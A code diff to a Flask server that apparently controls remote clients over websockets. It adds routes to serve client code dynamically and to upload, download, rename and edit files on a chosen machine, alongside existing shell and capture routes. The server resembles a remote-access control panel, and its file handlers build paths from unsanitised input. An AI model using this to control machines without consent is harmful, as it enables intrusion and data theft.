@@ -2,6 +2,7 @@ import base64
 import datetime
 import json
 import lzma
+import os
 import sys
 from flask import Flask, jsonify, request, render_template
 from flask_sockets import Sockets
@@ -26,7 +27,7 @@ class MSG:
     def get_data(self, data: dict) -> dict:
         wait_data = json.dumps(data)
         _data = {}
-        self.lock.acquire()
+        self.lock.acquire(timeout=5)
         try:
             self.ws.send(wait_data)
             _data = self.ws.receive()
@@ -43,6 +44,16 @@ def index():
     return render_template('index.html')
 
 
+@app.route('/base')
+def base():
+    """
+    返回客户端逻辑代码，动态加载
+    :return:
+    """
+    with open("base.py", "r", encoding="utf8") as f:
+        return f.read()
+
+
 @app.route('/api.json')
 def api():
     return jsonify({"code": 0, "data": [{"uid": i, "system": cache[i][1], "disk": cache[i][2], "uptime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} for i in cache.keys()]})
@@ -53,14 +64,10 @@ def ping(ws):
     msg = json.loads(ws.receive())
     uid = msg['uid']
     cache.update({uid: [MSG(ws), msg["system"], msg["disk"]]})
-    try:
-        while not ws.closed:
-            time.sleep(10)
-    except Exception as e:
-        pass
-    finally:
-        cache.pop(uid)
-        print("close..")
+    while not ws.closed:
+        time.sleep(1)
+    cache.pop(uid)
+    print("close..")
 
 
 @app.route('/capture/<uid>', methods=['GET', 'POST'])
@@ -93,10 +100,42 @@ def shell(uid):
 def file(uid):
     if request.method == "GET":
         return render_template('file.html', disk_root=[{"title": e_disk_path, "id": e_disk_path} for e_disk_path in cache[uid][2]])
-    else:
+    elif request.form.get("dir"):
         _dir = request.form.get("dir")
-        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "dir", "data": _dir})
-        return jsonify({"code": 0, "data": _data["raw"]})
+        if _dir:
+            _data = cache[uid][0].get_data({"v_uid": "0222", "type": "dir", "data": _dir})
+            return jsonify({"code": 0, "data": _data["raw"]})
+    elif request.form.get("action") == "upload":
+        _file = request.files["file"]
+        _path = os.path.join(request.form.get("src_path"), _file.filename)
+        _file_data = base64.b64encode(_file.read()).decode()
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "upload", "data": {"path": _path, "data": _file_data}})
+        return jsonify(_data)
+    else:
+        data = json.loads(request.data)
+        if data["action"] == "rename":
+            _data = cache[uid][0].get_data({"v_uid": "0222", "type": data["action"], "data": data})
+            return jsonify({"code": 0, "data": _data["raw"]})
+        if data["action"] == "download":
+            _data = cache[uid][0].get_data({"v_uid": "0222", "type": data["action"], "data": data})
+            with open("static/files/{}".format(data["filename"]), "wb") as f:
+                f.write(base64.b64decode(_data["data"]))
+            return jsonify({"code": 0})
+
+
+@app.route('/edit/<uid>', methods=['GET', 'POST'])
+def edit(uid):
+    if request.method == "GET":
+        path = request.args.get("path")
+        assert path
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "edit", "data": {"path": path}})
+        return render_template('edit.html', code=_data["raw"]["data"])
+
+    else:
+        path = request.args.get("path")
+        data = json.loads(request.data)["data"]
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "edit", "data": {"path": path, "data": data}})
+        return jsonify(_data)
 
 
 if __name__ == '__main__':
